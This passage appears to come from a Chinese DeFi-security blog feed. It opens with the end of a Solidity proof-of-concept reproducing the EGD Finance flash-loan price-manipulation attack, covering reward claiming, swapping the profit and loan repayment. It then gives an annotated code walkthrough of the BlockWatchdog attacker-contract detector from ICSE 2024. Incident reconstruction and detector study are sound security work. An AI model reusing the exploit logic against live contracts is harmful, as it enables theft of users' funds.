console.log(&quot;Flashloan[2] payback success&quot;);</span><br><span class="line"></span><br><span class="line">            // Swap all egd -&gt; usdt</span><br><span class="line">            console.log(&quot;Swap the profit...&quot;);</span><br><span class="line">            address[] memory path = new address[](2);</span><br><span class="line">            path[0] = egd;</span><br><span class="line">            path[1] = usdt;</span><br><span class="line">            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);</span><br><span class="line">            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">                IERC20(egd).balanceOf(address(this)), 1, path, address(this), block.timestamp</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 1e18); // Pancakeswap fee is 0.25%, so attacker needs to pay back usdt &gt;2000/0.9975 (Cannot be exactly 0.25%)</span><br><span class="line">            require(suc, &quot;Flashloan[1] payback failed&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            console.log(&quot;Flashloan[2] received&quot;);</span><br><span class="line">            emit log_named_decimal_uint(</span><br><span class="line">                &quot;[INFO] EGD/USDT Price after price manipulation&quot;, IEGD_Finance(EGD_Finance).getEGDPrice(), 18</span><br><span class="line">            );</span><br><span class="line">            // -----------------------------------------------------------------</span><br><span class="line">            console.log(&quot;Claim all EGD Token reward from EGD Finance contract&quot;);</span><br><span class="line">            IEGD_Finance(EGD_Finance).claimAllReward();</span><br><span class="line">            emit log_named_decimal_uint(&quot;[INFO] Get reward (EGD token)&quot;, IERC20(egd).balanceOf(address(this)), 18);</span><br><span class="line">            // -----------------------------------------------------------------</span><br><span class="line">            //计算需要总共返还闪电贷的费用</span><br><span class="line">            uint256 swapfee = (amount1 * 10_000 / 9970) - amount1; // Attacker needs to pay &gt;0.25% fee back to Pancakeswap</span><br><span class="line">            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1 + swapfee);</span><br><span class="line">            require(suc, &quot;Flashloan[2] payback failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// interface</span><br><span class="line">interface IEGD_Finance &#123;</span><br><span class="line">    function bond(address invitor) external;</span><br><span class="line">    function stake(uint256 amount) external;</span><br><span class="line">    function calculateAll(address addr) external view returns (uint256);</span><br><span class="line">    function claimAllReward() external;</span><br><span class="line">    function getEGDPrice() external view returns (uint256);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Defi安全</category>
      </categories>
      <tags>
        <tag>Defi安全</tag>
        <tag>安全事件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>ICSE2024--Blockwatchdog学习（一）</title>
    <url>/2024/05/09/ICSE2024-Blockwatchdog%E5%AD%A6%E4%B9%A0(%E4%B8%80)/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="1-blockwatchdog-py"><a href="#1-blockwatchdog-py" class="headerlink" title="1. blockwatchdog.py"></a>1. blockwatchdog.py</h2><p>该文件用以处理对应的命令行输入和相应的输出</p>
<p>输入对应的检测合约地址、公链以及对应区块即可。</p>
<h3 id="1）流信息的构建"><a href="#1）流信息的构建" class="headerlink" title="1）流信息的构建"></a>1）流信息的构建</h3><p>调用<code>Contract.py中的Contract()</code>实例化对应的合约。</p>
<p>获得分析合约中所有的函数签名，以及函数签名的中的外部调用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">original_contract = Contract(</span><br><span class="line">    source[<span class="string">&quot;platform&quot;</span>],</span><br><span class="line">    source[<span class="string">&quot;logic_addr&quot;</span>],</span><br><span class="line">    source[<span class="string">&quot;storage_addr&quot;</span>],</span><br><span class="line">    source[<span class="string">&quot;func_sign&quot;</span>],</span><br><span class="line">    source[<span class="string">&quot;block_number&quot;</span>],</span><br><span class="line">    source[<span class="string">&quot;caller&quot;</span>],</span><br><span class="line">    source[<span class="string">&quot;call_site&quot;</span>],</span><br><span class="line">    source[<span class="string">&quot;level&quot;</span>],</span><br><span class="line">    source[<span class="string">&quot;env_val&quot;</span>],</span><br><span class="line">)</span><br><span class="line">func_sign_list = original_contract.get_func_sign_list()</span><br><span class="line">external_call_in_func_sigature = (</span><br><span class="line">    original_contract.get_external_call_in_func_sigature()</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="2）跨合约调用图的构建"><a href="#2）跨合约调用图的构建" class="headerlink" title="2）跨合约调用图的构建"></a>2）跨合约调用图的构建</h3><p>对合约中每个外部调用进行跨合约调用图的构建</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(external_call_in_func_sigature) &gt; <span class="number">0</span>:</span><br><span class="line">    source = &#123;</span><br><span class="line">        <span class="string">&quot;platform&quot;</span>: args.platform,</span><br><span class="line">        <span class="string">&quot;logic_addr&quot;</span>: args.logic_addr,</span><br><span class="line">        <span class="string">&quot;storage_addr&quot;</span>: storage_addr,</span><br><span class="line">        <span class="string">&quot;func_sign&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;block_number&quot;</span>: args.block_number,</span><br><span class="line">        <span class="string">&quot;caller&quot;</span>: <span class="string">&quot;msg.sender&quot;</span>,</span><br><span class="line">        <span class="string">&quot;caller_func_sign&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;call_site&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;level&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;env_val&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    source[<span class="string">&quot;func_sign&quot;</span>] = external_call_in_func_sigature.pop()</span><br><span class="line">    cross_contract_call_graph = CallGraph(source, contracts, source[<span class="string">&quot;platform&quot;</span>])</span><br><span class="line">    cross_contract_call_graph.construct_cross_contract_call_graph()</span><br><span class="line">    <span class="comment"># 构建对应的跨合约调用图，这里利用DFS构建对应的跨合约调用图</span></span><br><span class="line">    visited_contracts = (</span><br><span class="line">        visited_contracts + cross_contract_call_graph.visited_contracts</span><br><span class="line">    )</span><br><span class="line">    visited_funcs = visited_funcs + cross_contract_call_graph.visited_funcs</span><br><span class="line">    call_depth = cross_contract_call_graph.max_level</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> call_depth &gt; max_call_depth:</span><br><span class="line">        max_call_depth = call_depth</span><br><span class="line">    <span class="comment"># 最大调用长度的相关限制</span></span><br><span class="line"></span><br><span class="line">    call_graph_str = cross_contract_call_graph.get_output()</span><br><span class="line">    call_paths.append(call_graph_str)</span><br><span class="line">    <span class="comment"># 相应的调用路径的输出</span></span><br><span class="line"></span><br><span class="line">m_call_depth = max_call_depth</span><br></pre></td></tr></table></figure>
<h3 id="3）污点分析"><a href="#3）污点分析" class="headerlink" title="3）污点分析"></a>3）污点分析</h3><p>首先调用<code>FlowAnalysis()</code>实例化对应的检测器，并进行相应的检测</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">detector = FlowAnalysis(</span><br><span class="line">    source[<span class="string">&quot;logic_addr&quot;</span>],</span><br><span class="line">    contracts,</span><br><span class="line">    func_sign_list,</span><br><span class="line">    store_external_call_in_func_sigature_list,</span><br><span class="line">    visited_contracts,</span><br><span class="line">    visited_funcs,</span><br><span class="line">)        </span><br><span class="line">result[<span class="string">&quot;is_attack&quot;</span>], result[<span class="string">&quot;attack_matrix&quot;</span>] = detector.detect()</span><br><span class="line"><span class="comment">#进行相应的污点分析，漏洞检测</span></span><br><span class="line">result[<span class="string">&quot;semantic_features&quot;</span>][<span class="string">&quot;op_creation&quot;</span>][</span><br><span class="line">    <span class="string">&quot;op_multicreate&quot;</span></span><br><span class="line">] = detector.op_multicreate_analysis()</span><br><span class="line">result[<span class="string">&quot;semantic_features&quot;</span>][<span class="string">&quot;op_creation&quot;</span>][</span><br><span class="line">    <span class="string">&quot;op_solecreate&quot;</span></span><br><span class="line">] = detector.op_solecreate_analysis()</span><br><span class="line">result[<span class="string">&quot;semantic_features&quot;</span>][<span class="string">&quot;op_selfdestruct&quot;</span>] = detector.op_selfdestruct_analysis()</span><br><span class="line">result[<span class="string">&quot;semantic_features&quot;</span>][<span class="string">&quot;op_env&quot;</span>] = detector.tainted_env_call_arg()</span><br><span class="line"></span><br><span class="line">result[<span class="string">&quot;external_call&quot;</span>][<span class="string">&quot;externalcall_inhook&quot;</span>] = detector.externalcall_inhook()</span><br><span class="line">result[<span class="string">&quot;external_call&quot;</span>][</span><br><span class="line">    <span class="string">&quot;externalcall_infallback&quot;</span></span><br><span class="line">] = detector.externalcall_infallback()</span><br><span class="line"></span><br><span class="line">sensitive_callsigs = detector.get_sig_info()</span><br><span class="line">victim_callback_info, attack_reenter_info = detector.get_reen_info()</span><br></pre></td></tr></table></figure>
<h2 id="2-Contract-py"><a href="#2-Contract-py" class="headerlink" title="2. Contract.py"></a>2. Contract.py</h2><p>该文件主要用于对输入的合约地址进行处理，获取相应的字节码，并且调用gigahorse反编译的引擎进行相应的处理</p>
<p>最关键的是<code>self.analyze()</code>函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">def</span> <span class="title function_">analyze</span>(<span class="params">self</span>):</span><br><span class="line">     logging.info(<span class="string">&quot;analyzing &quot;</span> + self.logic_addr)</span><br><span class="line">     logging.info(<span class="string">&quot;caller &quot;</span> + self.caller)</span><br><span class="line">     logging.info(<span class="string">&quot;call_site &quot;</span> + self.call_site)</span><br><span class="line">     logging.info(<span class="string">&quot;func_sign &quot;</span> + self.func_sign)</span><br><span class="line">     self.set_url()</span><br><span class="line">     <span class="comment">#设置web3库的相应url</span></span><br><span class="line">     self.download_bytecode()</span><br><span class="line">     <span class="comment">#如果没检测过相应的地址，则通过web3获取字节码保存到指定位置</span></span><br><span class="line">     <span class="keyword">if</span> os.path.exists(global_params.CONTRACT_PATH + self.logic_addr + <span class="string">&quot;.hex&quot;</span>):</span><br><span class="line">         self.analyze_contract()</span><br><span class="line">         <span class="comment"># 调用gigahorse，对合约字节码进行反编译处理，生成相应的数据流和控制流关系</span></span><br><span class="line">         self.set_func()</span><br><span class="line"><span class="comment"># 调用gigahorse解析结果，获取对应的函数位置和函数签名</span></span><br><span class="line">         self.set_callArgVals()</span><br><span class="line">         self.set_knownArgVals()</span><br><span class="line">         <span class="comment"># 保存对应的外部调用的Call位置，以及对应的函数参数</span></span><br><span class="line">         </span><br><span class="line">         logging.info(</span><br><span class="line">             <span class="string">&quot;call arg vals obtained from the previous contract call &#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                 self.callArgVals</span><br><span class="line">             )</span><br><span class="line">         )</span><br><span class="line">         logging.info(</span><br><span class="line">             <span class="string">&quot;known arg vals in the current contract call &#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                 self.knownArgVals</span><br><span class="line">             )</span><br><span class="line">         )</span><br><span class="line">         <span class="keyword">if</span> self.origin <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">             <span class="keyword">if</span> <span class="keyword">not</span> self.createbin:</span><br><span class="line">                 <span class="comment"># remove key 0x0 from the dict  func_sign_dict</span></span><br><span class="line">                 <span class="keyword">del</span> self.func_sign_dict[<span class="string">&quot;0x0&quot;</span>]</span><br><span class="line">             <span class="keyword">for</span> func <span class="keyword">in</span> self.func_sign_dict.keys():</span><br><span class="line">                 logging.info(</span><br><span class="line">                     <span class="string">&quot;set external calls in function &quot;</span> + self.func_sign_dict[func]</span><br><span class="line">                 )</span><br><span class="line">                 self.set_external_calls(func, self.func_sign_dict[func])</span><br><span class="line">         <span class="keyword">else</span>:</span><br><span class="line">             self.set_external_calls(self.func, self.func_sign)</span><br><span class="line">         <span class="comment">## 设置对应的外部调用，最关键的一步</span></span><br></pre></td></tr></table></figure>
<p><code>self.set_external_calls()</code>调用链的获取，主要依赖于gigahorse的分析能力</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">def</span> <span class="title function_">set_external_calls</span>(<span class="params">self, func, func_sign</span>):</span><br><span class="line">     loc_external_call = (</span><br><span class="line">         <span class="string">&quot;./gigahorse-toolchain/.temp/&quot;</span></span><br><span class="line">         + self.logic_addr</span><br><span class="line">         + <span class="string">&quot;/out/Leslie_ExternalCallInfo.csv&quot;</span></span><br><span class="line">     )</span><br><span class="line">     <span class="keyword">if</span> os.path.exists(loc_external_call) <span class="keyword">and</span> (</span><br><span class="line">         os.path.getsize(loc_external_call) &gt; <span class="number">0</span></span><br><span class="line">     ):</span><br><span class="line">         df_external_call = pd.read_csv(loc_external_call, header=<span class="literal">None</span>, sep=<span class="string">&quot;	&quot;</span>)</span><br><span class="line">         df_external_call.columns = [</span><br><span class="line">             <span class="string">&quot;func&quot;</span>,</span><br><span class="line">             <span class="string">&quot;callStmt&quot;</span>,</span><br><span class="line">             <span class="string">&quot;callOp&quot;</span>,</span><br><span class="line">             <span class="string">&quot;calleeVar&quot;</span>,</span><br><span class="line">             <span class="string">&quot;numArg&quot;</span>,</span><br><span class="line">             <span class="string">&quot;numRet&quot;</span>,</span><br><span class="line">         ]</span><br><span class="line">         <span class="keyword">try</span>:</span><br><span class="line">             df_external_call = df_external_call.loc[</span><br><span class="line">                 df_external_call[<span class="string">&quot;func&quot;</span>] == func</span><br><span class="line">             ]</span><br><span class="line">             <span class="comment">#找到函数签名中存在外部调用的函数吊命</span></span><br><span class="line">         <span class="keyword">except</span> Exception:</span><br><span class="line">             <span class="keyword">pass</span></span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         df_external_call = pd.DataFrame()</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> self.origin <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df_external_call)):</span><br><span class="line">             func = df_external_call.iloc[i][<span class="string">&quot;func&quot;</span>]</span><br><span class="line">             <span class="comment"># find functions with external calls</span></span><br><span class="line">             <span class="keyword">if</span> self.func_sign_dict[func] <span class="keyword">not</span> <span class="keyword">in</span> self.external_call_in_func_sigature:</span><br><span class="line">                 self.external_call_in_func_sigature.append(</span><br><span class="line">                     self.func_sign_dict[func]</span><br><span class="line">                 )</span><br><span class="line">             <span class="comment">#将对应存在外部调用函数保存到对应的属性中</span></span><br><span class="line"></span><br><span class="line">     <span class="comment"># for callee identification</span></span><br><span class="line">     loc_callee_const = (</span><br><span class="line">         <span class="string">&quot;./gigahorse-toolchain/.temp/&quot;</span></span><br><span class="line">         + self.logic_addr</span><br><span class="line">         + <span class="string">&quot;/out/Leslie_ExternalCall_Callee_ConstType.csv&quot;</span></span><br><span class="line">     )</span><br><span class="line">     <span class="comment"># 常量保存的调用合约地址</span></span><br><span class="line">     <span class="keyword">if</span> os.path.exists(loc_callee_const) <span class="keyword">and</span> (os.path.getsize(loc_callee_const) &gt; <span class="number">0</span>):</span><br><span class="line">         df_callee_const = pd.read_csv(loc_callee_const, header=<span class="literal">None</span>, sep=<span class="string">&quot;	&quot;</span>)</span><br><span class="line">         df_callee_const.columns = [<span class="string">&quot;func&quot;</span>, <span class="string">&quot;callStmt&quot;</span>, <span class="string">&quot;callee&quot;</span>]</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         df_callee_const = pd.DataFrame()</span><br><span class="line"></span><br><span class="line">     loc_callee_storage = (</span><br><span class="line">         <span class="string">&quot;./gigahorse-toolchain/.temp/&quot;</span></span><br><span class="line">         + self.logic_addr</span><br><span class="line">         + <span class="string">&quot;/out/Leslie_ExternalCall_Callee_StorageType.csv&quot;</span></span><br><span class="line">     )</span><br><span class="line">     <span class="comment"># Storage中保存的调用合约地址</span></span><br><span class="line">     <span class="keyword">if</span> os.path.exists(loc_callee_storage) <span class="keyword">and</span> (</span><br><span class="line">         os.path.getsize(loc_callee_storage) &gt; <span class="number">0</span></span><br><span class="line">     ):</span><br><span class="line">         df_callee_storage = pd.read_csv(loc_callee_storage, header=<span class="literal">None</span>, sep=<span class="string">&quot;	&quot;</span>)</span><br><span class="line">         df_callee_storage.columns = [</span><br><span class="line">             <span class="string">&quot;func&quot;</span>,</span><br><span class="line">             <span class="string">&quot;callStmt&quot;</span>,</span><br><span class="line">             <span class="string">&quot;storageSlot&quot;</span>,</span><br><span class="line">             <span class="string">&quot;byteLow&quot;</span>,</span><br><span class="line">             <span class="string">&quot;byteHigh&quot;</span>,</span><br><span class="line">         ]</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         df_callee_storage = pd.DataFrame()</span><br><span class="line"></span><br><span class="line">     loc_callee_storage_proxy = (</span><br><span class="line">         <span class="string">&quot;./gigahorse-toolchain/.temp/&quot;</span></span><br><span class="line">         + self.logic_addr</span><br><span class="line">         + <span class="string">&quot;/out/Leslie_ExternalCall_Callee_StorageType_ForProxy.csv&quot;</span></span><br><span class="line">     )</span><br><span class="line">     <span class="comment"># 代理合约的stroage中保存的调用合约地址</span></span><br><span class="line">     <span class="keyword">if</span> os.path.exists(loc_callee_storage_proxy) <span class="keyword">and</span> (</span><br><span class="line">         os.path.getsize(loc_callee_storage_proxy) &gt; <span class="number">0</span></span><br><span class="line">     ):</span><br><span class="line">         df_callee_storage_proxy = pd.read_csv(</span><br><span class="line">             loc_callee_storage_proxy, header=<span class="literal">None</span>, sep=<span class="string">&quot;	&quot;</span></span><br><span class="line">         )</span><br><span class="line">         df_callee_storage_proxy.columns = [<span class="string">&quot;func&quot;</span>, <span class="string">&quot;callStmt&quot;</span>, <span class="string">&quot;storageSlot&quot;</span>]</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         df_callee_storage_proxy = pd.DataFrame()</span><br><span class="line"></span><br><span class="line">     <span class="comment"># for target function signature identification</span></span><br><span class="line">     loc_fs_const = (</span><br><span class="line">         <span class="string">&quot;./gigahorse-toolchain/.temp/&quot;</span></span><br><span class="line">         + self.logic_addr</span><br><span class="line">         + <span class="string">&quot;/out/Leslie_ExternalCall_FuncSign_ConstType.csv&quot;</span></span><br><span class="line">     )</span><br><span class="line">     <span class="comment"># 常量方式取出对应的调用函数签名</span></span><br><span class="line">     <span class="keyword">if</span> os.path.exists(loc_fs_const) <span class="keyword">and</span> (os.path.getsize(loc_fs_const) &gt; <span class="number">0</span>):</span><br><span class="line">         df_fs_const = pd.read_csv(loc_fs_const, header=<span class="literal">None</span>, sep=<span class="string">&quot;	&quot;</span>)</span><br><span class="line">         df_fs_const.columns = [<span class="string">&quot;func&quot;</span>, <span class="string">&quot;callStmt&quot;</span>, <span class="string">&quot;funcSign&quot;</span>]</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         df_fs_const = pd.DataFrame()</span><br><span class="line"></span><br><span class="line">     loc_fs_proxy = (</span><br><span class="line">         <span class="string">&quot;./gigahorse-toolchain/.temp/&quot;</span></span><br><span class="line">         + self.logic_addr</span><br><span class="line">         + <span class="string">&quot;/out/Leslie_ExternalCall_FuncSign_ProxyType.csv&quot;</span></span><br><span class="line">     )</span><br><span class="line">     <span class="comment"># 代理的方式取出对应的函数签名</span></span><br><span class="line">     </span><br><span class="line">     <span class="keyword">if</span> os.path.exists(loc_fs_proxy) <span class="keyword">and</span> (os.path.getsize(loc_fs_proxy) &gt; <span class="number">0</span>):</span><br><span class="line">         df_fs_proxy = pd.read_csv(loc_fs_proxy, header=<span class="literal">None</span>, sep=<span class="string">&quot;	&quot;</span>)</span><br><span class="line">         df_fs_proxy.columns = [<span class="string">&quot;func&quot;</span>, <span class="string">&quot;callStmt&quot;</span>]</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         df_fs_proxy = pd.DataFrame()</span><br><span class="line"></span><br><span class="line">     loc_callee_funarg = (</span><br><span class="line">         <span class="string">&quot;./gigahorse-toolchain/.temp/&quot;</span></span><br><span class="line">         + self.logic_addr</span><br><span class="line">         + <span class="string">&quot;/out/Leslie_ExternalCall_Callee_FuncArgType.csv&quot;</span></span><br><span class="line">     )</span><br><span class="line">     <span class="comment">#外部参数传入的调用函数签名</span></span><br><span class="line">     <span class="keyword">if</span> os.path.exists(loc_callee_funarg) <span class="keyword">and</span> (</span><br><span class="line">         os.path.getsize(loc_callee_funarg) &gt; <span class="number">0</span></span><br><span class="line">     ):</span><br><span class="line">         df_callee_funarg = pd.read_csv(loc_callee_funarg, header=<span class="literal">None</span>, sep=<span class="string">&quot;	&quot;</span>)</span><br><span class="line">         df_callee_funarg.columns = [<span class="string">&quot;func&quot;</span>, <span class="string">&quot;callStmt&quot;</span>, <span class="string">&quot;pubFun&quot;</span>, <span class="string">&quot;argIndex&quot;</span>]</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         df_callee_funarg = pd.DataFrame()</span><br><span class="line"></span><br><span class="line">     transfer_target_call = self.get_sensitive_transfer_target()</span><br><span class="line">     <span class="comment"># 查看外部调用中是否存在敏感的transfer调用操作</span></span><br><span class="line">     </span><br><span class="line">     log.info(<span class="string">&quot;transfer target call&quot;</span>)</span><br><span class="line">     log.info(transfer_target_call)</span><br><span class="line">     <span class="comment"># for every call point in the contract, try to find its call target</span></span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df_external_call)):</span><br><span class="line">         call_stmt = df_external_call.iloc[i][<span class="string">&quot;callStmt&quot;</span>]</span><br><span class="line">         <span class="comment"># find target callee&#x27;s logic address</span></span><br><span class="line">         external_call = &#123;</span><br><span class="line">             <span class="string">&quot;logic_addr&quot;</span>: <span class="string">&quot;&quot;</span>,  <span class="comment"># target contract address</span></span><br><span class="line">             <span class="string">&quot;storage_addr&quot;</span>: <span class="string">&quot;&quot;</span>,  <span class="comment"># target contract storage address</span></span><br><span class="line">             <span class="string">&quot;funcSign&quot;</span>: <span class="string">&quot;&quot;</span>,  <span class="comment"># target function signature (after)</span></span><br><span class="line">             <span class="string">&quot;caller&quot;</span>: <span class="string">&quot;&quot;</span>,  <span class="comment"># caller address (msg.sender for the origin) (current)</span></span><br><span class="line">             <span class="string">&quot;call_site&quot;</span>: <span class="string">&quot;&quot;</span>,  <span class="comment"># external call site (current)</span></span><br><span class="line">             <span class="string">&quot;known_args&quot;</span>: &#123;&#125;,  <span class="comment"># record all known args from env and storage, etc.</span></span><br><span class="line">             <span class="string">&quot;transfer_target&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> call_stmt <span class="keyword">in</span> transfer_target_call:</span><br><span class="line">             external_call[<span class="string">&quot;transfer_target&quot;</span>] = self.knownArgVals[call_stmt][<span class="number">0</span>]</span><br><span class="line">             log.info(<span class="string">&quot;transfer target&quot;</span>)</span><br><span class="line">             log.info(external_call[<span class="string">&quot;transfer_target&quot;</span>])</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> <span class="built_in">len</span>(df_callee_const) != <span class="number">0</span>:</span><br><span class="line">             df_temp = df_callee_const.loc[df_callee_const[<span class="string">&quot;callStmt&quot;</span>] == call_stmt]</span><br><span class="line">             <span class="keyword">if</span> <span class="built_in">len</span>(df_temp) &gt; <span class="number">0</span>:</span><br><span class="line">                 external_call[<span class="string">&quot;logic_addr&quot;</span>] = <span class="built_in">list</span>(df_temp[<span class="string">&quot;callee&quot;</span>])[<span class="number">0</span>].replace(</span><br><span class="line">                     <span class="string">&quot;000000000000000000000000&quot;</span>, <span class="string">&quot;&quot;</span></span><br><span class="line">                 )</span><br><span class="line">         <span class="comment"># 如何调用者地址保存在了常量中，进行相应处理</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> <span class="built_in">len</span>(df_callee_storage) != <span class="number">0</span>:</span><br><span class="line">             df_temp = df_callee_storage.loc[</span><br><span class="line">                 df_callee_storage[<span class="string">&quot;callStmt&quot;</span>] == call_stmt</span><br><span class="line">             ]</span><br><span class="line">             <span class="keyword">if</span> <span class="built_in">len</span>(df_temp) &gt; <span class="number">0</span>:</span><br><span class="line">                 <span class="keyword">if</span> self.storage_addr <span class="keyword">in</span> global_params.STORAGE_SPACE.keys():</span><br><span class="line">                     <span class="keyword">if</span> (</span><br><span class="line">                         <span class="built_in">list</span>(df_temp[<span class="string">&quot;storageSlot&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">                         <span class="keyword">in</span> global_params.STORAGE_SPACE[self.storage_addr].keys()</span><br><span class="line">                     ):</span><br><span class="line">                         external_call[<span class="string">&quot;logic_addr&quot;</span>] = global_params.STORAGE_SPACE[</span><br><span class="line">                             self.storage_addr</span><br><span class="line">                         ][<span class="built_in">list</span>(df_temp[<span class="string">&quot;storageSlot&quot;</span>])[<span class="number">0</span>]]</span><br><span class="line">                     <span class="keyword">else</span>:</span><br><span class="line">                         external_call[<span class="string">&quot;logic_addr&quot;</span>] = self.get_storage_content(</span><br><span class="line">                             <span class="built_in">list</span>(df_temp[<span class="string">&quot;storageSlot&quot;</span>])[<span class="number">0</span>],</span><br><span class="line">                             <span class="built_in">list</span>(df_temp[<span class="string">&quot;byteLow&quot;</span>])[<span class="number">0</span>],</span><br><span class="line">                             <span class="built_in">list</span>(df_temp[<span class="string">&quot;byteHigh&quot;</span>])[<span class="number">0</span>],</span><br><span class="line">                         )</span><br><span class="line">                         global_params.STORAGE_SPACE[self.storage_addr][</span><br><span class="line">                             <span class="built_in">list</span>(df_temp[<span class="string">&quot;storageSlot&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">                         ] = external_call[<span class="string">&quot;logic_addr&quot;</span>]</span><br><span class="line">                 <span class="keyword">else</span>:</span><br><span class="line"><span class="comment">#如果没提供对应的storage_address的情况</span></span><br><span class="line">                     global_params.STORAGE_SPACE[self.storage_addr] = &#123;&#125;</span><br><span class="line">                     external_call[<span class="string">&quot;logic_addr&quot;</span>] = self.get_storage_content(</span><br><span class="line">                         <span class="built_in">list</span>(df_temp[<span class="string">&quot;storageSlot&quot;</span>])[<span class="number">0</span>],</span><br><span class="line">                         <span class="built_in">list</span>(df_temp[<span class="string">&quot;byteLow&quot;</span>])[<span class="number">0</span>],</span><br><span class="line">                         <span class="built_in">list</span>(df_temp[<span class="string">&quot;byteHigh&quot;</span>])[<span class="number">0</span>],</span><br><span class="line">                     )</span><br><span class="line">     <span class="comment"># 如果调用者地址保存在了storage中，输入对应的插槽地址偏移量和对应的字节长度，获取对应的调用地址，该函数通过web3.get_storage_at()获得对应的地址</span></span><br><span class="line">                     global_params.STORAGE_SPACE[self.storage_addr][</span><br><span class="line">                         <span class="built_in">list</span>(df_temp[<span class="string">&quot;storageSlot&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">                     ] = external_call[<span class="string">&quot;logic_addr&quot;</span>]</span><br><span class="line">         <span class="comment"># 将插槽对应地址建立映射</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> <span class="built_in">len</span>(df_callee_storage_proxy) != <span class="number">0</span>:</span><br><span class="line">             df_temp = df_callee_storage_proxy.loc[</span><br><span class="line">                 df_callee_storage_proxy[<span class="string">&quot;callStmt&quot;</span>] == call_stmt</span><br><span class="line">             ]</span><br><span class="line">             <span class="keyword">if</span> <span class="built_in">len</span>(df_temp) &gt; <span class="number">0</span>:</span><br><span class="line">                 <span class="keyword">if</span> self.storage_addr <span class="keyword">in</span> global_params.STORAGE_SPACE.keys():</span><br><span class="line">                     <span class="keyword">if</span> (</span><br><span class="line">                         <span class="built_in">list</span>(df_temp[<span class="string">&quot;storageSlot&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">                         <span class="keyword">in</span> global_params.STORAGE_SPACE[self.storage_addr].keys()</span><br><span class="line">                     ):</span><br><span class="line">                         external_call[<span class="string">&quot;logic_addr&quot;</span>] = global_params.STORAGE_SPACE[</span><br><span class="line">                             self.storage_addr</span><br><span class="line">                         ][<span class="built_in">list</span>(df_temp[<span class="string">&quot;storageSlot&quot;</span>])[<span class="number">0</span>]]</span><br><span class="line">                     <span class="keyword">else</span>:</span><br><span class="line">                         external_call[<span class="string">&quot;logic_addr&quot;</span>] = self.get_storage_content(</span><br><span class="line">                             <span class="built_in">list</span>(df_temp[<span class="string">&quot;storageSlot&quot;</span>])[<span class="number">0</span>], <span class="number">0</span>, <span class="number">19</span></span><br><span class="line">                         )</span><br><span class="line">                         global_params.STORAGE_SPACE[self.storage_addr][</span><br><span class="line">                             <span class="built_in">list</span>(df_temp[<span class="string">&quot;storageSlot&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">                         ] = external_call[<span class="string">&quot;logic_addr&quot;</span>]</span><br><span class="line">                 <span class="keyword">else</span>:</span><br><span class="line">                     global_params.STORAGE_SPACE[self.storage_addr] = &#123;&#125;</span><br><span class="line">                     external_call[<span class="string">&quot;logic_addr&quot;</span>] = self.get_storage_content(</span><br><span class="line">                         <span class="built_in">list</span>(df_temp[<span class="string">&quot;storageSlot&quot;</span>])[<span class="number">0</span>], <span class="number">0</span>, <span class="number">19</span></span><br><span class="line">                     )</span><br><span class="line"><span class="comment"># 同理，获取storage_proxy中对应的调用函数地址 </span></span><br><span class="line">         </span><br><span class="line">         <span class="comment"># find callee got from the func arg (called by caller), and try to recover the know args</span></span><br><span class="line">         <span class="keyword">if</span> <span class="built_in">len</span>(df_callee_funarg) != <span class="number">0</span>:</span><br><span class="line">             df_temp = df_callee_funarg.loc[</span><br><span class="line">                 df_callee_funarg[<span 